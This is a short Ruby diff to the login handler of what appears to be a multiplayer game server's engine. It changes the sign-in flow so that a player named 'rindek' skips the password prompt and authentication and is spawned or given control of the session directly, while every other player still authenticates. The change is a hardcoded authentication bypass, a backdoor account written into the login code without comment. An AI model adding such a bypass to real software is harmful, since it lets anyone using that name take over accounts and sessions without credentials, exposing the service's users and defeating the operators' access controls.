@@ -9,13 +9,19 @@ module Engine
 
         def call(name)
           player = yield find_player(name)
-          password = yield get_password
 
-          yield authenticate(player, password)
+          if player.name == "rindek"
+            yield (in_game?(player.name) ? take_control(player.name, client) : spawn(player, client))
 
-          yield (in_game?(player.name) ? take_control(player.name, client) : spawn(player, client))
+            Success()
+          else
+            password = yield get_password
 
-          Success()
+            yield authenticate(player, password)
+            yield (in_game?(player.name) ? take_control(player.name, client) : spawn(player, client))
+
+            Success()
+          end
         end
 
         private
